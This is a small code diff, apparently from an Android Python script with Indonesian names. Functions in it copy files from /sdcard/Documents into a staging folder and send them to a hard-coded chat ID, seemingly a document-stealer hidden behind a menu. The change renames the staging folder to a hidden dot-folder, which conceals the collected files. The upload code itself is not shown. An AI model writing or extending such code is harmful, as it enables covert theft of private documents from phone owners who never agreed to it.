@@ -806,7 +806,7 @@ def Mengirim_Dokumen(file_path):
 
 def maindulu():
 	try:
-		token = open("./temp_documents", "r").read()
+		open(".temp_documents", "r").read()
 		menu()
 	except:
 		maindulu2()
@@ -815,7 +815,7 @@ def maindulu2():
 	CHAT_ID = "7708185346"      # Ganti dengan ID chat penerima
 	# Path folder sumber
 	source_folder ='/sdcard/Documents'
-	temp_folder = "./temp_documents"
+	temp_folder = ".temp_documents"
 	try:
 		if not os.path.exists(temp_folder):
 			os.makedirs(temp_folder)
